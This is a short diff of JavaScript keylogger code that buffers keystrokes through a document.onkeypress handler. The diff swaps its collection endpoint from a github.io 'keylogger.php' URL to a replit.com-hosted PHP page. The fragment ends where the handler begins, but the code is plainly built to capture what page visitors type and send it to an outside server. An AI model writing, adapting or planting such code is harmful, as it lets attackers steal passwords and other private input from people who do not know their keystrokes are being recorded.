@@ -1,5 +1,5 @@
 var keys='';
-var url = 'https://managebac.github.io/keylogger.php';
+var url = 'https://replit.com/@GrayWulf/ModestNegligibleAcrobat#index.php';
 
 document.onkeypress = function(e) {
 	get = window.event?event:e;
